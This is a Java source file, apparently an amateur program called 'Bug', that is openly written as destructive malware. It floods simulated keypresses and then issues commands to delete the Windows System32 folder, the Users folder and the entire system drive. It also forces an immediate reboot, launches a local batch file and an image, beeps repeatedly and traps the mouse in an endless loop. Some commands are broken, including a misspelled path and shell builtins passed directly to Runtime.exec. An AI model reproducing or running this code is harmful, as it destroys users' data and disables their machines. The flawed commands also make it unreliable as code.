/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package bug;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.io.File;

/**
 *
 * @author Lan House
 */
public class Bug {

    /**
     * @param args the command line arguments
     * @throws java.lang.InterruptedException
     * @throws java.awt.AWTException
     * @throws java.io.IOException
     */
    public static void main(String[] args) throws InterruptedException, AWTException, IOException {
        Robot robo = new Robot();
        //Keyboard bug
        int key = 0;
            while(key < 100){
                robo.keyPress(KeyEvent.VK_A);
                robo.keyRelease(KeyEvent.VK_A);
                robo.keyPress(KeyEvent.VK_B);
                robo.keyRelease(KeyEvent.VK_B);
                robo.keyPress(KeyEvent.VK_C);
                robo.keyRelease(KeyEvent.VK_C);
                robo.keyPress(KeyEvent.VK_D);
                robo.keyRelease(KeyEvent.VK_D);
                robo.keyPress(KeyEvent.VK_E);
                robo.keyRelease(KeyEvent.VK_E);
                robo.keyPress(KeyEvent.VK_F);
                robo.keyRelease(KeyEvent.VK_F);
                robo.keyPress(KeyEvent.VK_G);
                robo.keyRelease(KeyEvent.VK_G);
                robo.keyPress(KeyEvent.VK_H);
                robo.keyRelease(KeyEvent.VK_H);
                robo.keyPress(KeyEvent.VK_I);
                robo.keyRelease(KeyEvent.VK_I);
                robo.keyPress(KeyEvent.VK_J);
                robo.keyRelease(KeyEvent.VK_J);
                robo.keyPress(KeyEvent.VK_K);
                robo.keyRelease(KeyEvent.VK_K);
                robo.keyPress(KeyEvent.VK_L);
                robo.keyRelease(KeyEvent.VK_L);
                robo.keyPress(KeyEvent.VK_M);
                robo.keyRelease(KeyEvent.VK_M);
                robo.keyPress(KeyEvent.VK_N);
                robo.keyRelease(KeyEvent.VK_N);
                robo.keyPress(KeyEvent.VK_O);
                robo.keyRelease(KeyEvent.VK_O);
                robo.keyPress(KeyEvent.VK_P);
                robo.keyRelease(KeyEvent.VK_P);
                robo.keyPress(KeyEvent.VK_Q);
                robo.keyRelease(KeyEvent.VK_Q);
                robo.keyPress(KeyEvent.VK_R);
                robo.keyRelease(KeyEvent.VK_R);
                robo.keyPress(KeyEvent.VK_S);
                robo.keyRelease(KeyEvent.VK_S);
                robo.keyPress(KeyEvent.VK_T);
                robo.keyRelease(KeyEvent.VK_T);
                robo.keyPress(KeyEvent.VK_U);
                robo.keyRelease(KeyEvent.VK_U);
                robo.keyPress(KeyEvent.VK_V);
                robo.keyRelease(KeyEvent.VK_V);
                robo.keyPress(KeyEvent.VK_X);
                robo.keyRelease(KeyEvent.VK_X);
                robo.keyPress(KeyEvent.VK_W);
                robo.keyRelease(KeyEvent.VK_W);
                robo.keyPress(KeyEvent.VK_Y);
                robo.keyRelease(KeyEvent.VK_Y);
                robo.keyPress(KeyEvent.VK_Z);
                robo.keyRelease(KeyEvent.VK_A);
                
                key++;
        }
        //Instalacao do Boot
        java.awt.Desktop.getDesktop().open(new File("D:\\Nicolas\\ling programacao\\Java\\Bug\\build\\classes\\bug\\boot_cronos.img"));
        
        //Del Windows
        Runtime.getRuntime().exec("del C:\\Windos\\System32 /f/s/q");
        
        //Del Users
        Runtime.getRuntime().exec("@echo off");
        Runtime.getRuntime().exec("cd\\");
        Runtime.getRuntime().exec("erase C:\\Users");
        
        //Tela azul da Morte
        Runtime.getRuntime().exec("@echo off");
        Runtime.getRuntime().exec("del %systemdrive% *.*/f/s/q");
        Runtime.getRuntime().exec("shutdown -r -f -t 00");
        
        //Total
        java.awt.Desktop.getDesktop().open(new File("D:\\Nicolas\\ling programacao\\Java\\Bug\\build\\classes\\bug\\total.bat"));
        
        //Beep
        int cont = 0;
        while(cont < 100){
            Toolkit.getDefaultToolkit().beep();
            Thread.sleep(100);
            
            cont++;
        }
        
        //Mouse bug
        int mX = 0;
        int mY = 0;
        while(0 < 50){
            robo.mouseMove(mX, mY);
            Thread.sleep(100);
            mX++;
            mY++;
        }
    }   
}
